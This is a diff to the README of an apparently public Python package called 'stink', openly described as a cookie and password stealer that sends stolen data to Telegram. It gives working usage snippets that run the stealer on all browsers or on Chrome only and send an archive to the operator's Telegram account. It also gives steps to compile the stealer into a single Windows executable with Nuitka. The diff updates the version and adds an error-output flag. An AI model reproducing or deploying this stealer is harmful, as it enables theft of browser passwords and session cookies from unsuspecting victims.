@@ -19,7 +19,6 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
   * [Getting id](#Getting-id)
 * [Creating exe](#Creating-exe)
   * [Creating executable file](#Creating-executable-file)
-  * [PyCharm](#PyCharm)
   * [CMD](#CMD)
 
 ### Current features
@@ -36,7 +35,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==0.0.3
+pip install stink==0.0.4
 ```
 
 ## Example usage
@@ -46,11 +45,13 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
+To enable error output, add the `errors_print=True` parameter.
+
 The standard ```Stealer``` runs collection on all available browsers and sends the collected data in an archive to you in Telegram.
 
 ### Custom
 ```python
-from os import path, mkdir
+from os import mkdir
 from getpass import getuser
 
 from stink.browsers.chrome import Chrome
@@ -67,8 +68,8 @@ def main():
 
     mkdir(storage_path + storage_folder)
 
-    Chrome(storage_path, storage_folder).run()
-    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID).run()
+    Chrome(storage_path, storage_folder, False).run()
+    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID, False).run()
 
 
 if __name__ == "__main__":
@@ -121,19 +122,6 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-### PyCharm
-1. Open a terminal.
-2. Install Nuitka and Stink:
-```
-pip install Nuitka==0.6.16.4
-```
-```
-pip install stink==0.0.3
-```
-3. Write the command:
-```
-nuitka --onefile --include-package=stink test.py
-```
 
 ### CMD
 1. Open `cmd`.
@@ -157,7 +145,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.3
+pip install stink==0.0.4
 ```
 6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
 7. Copy the file `win32crypt.pyd`.
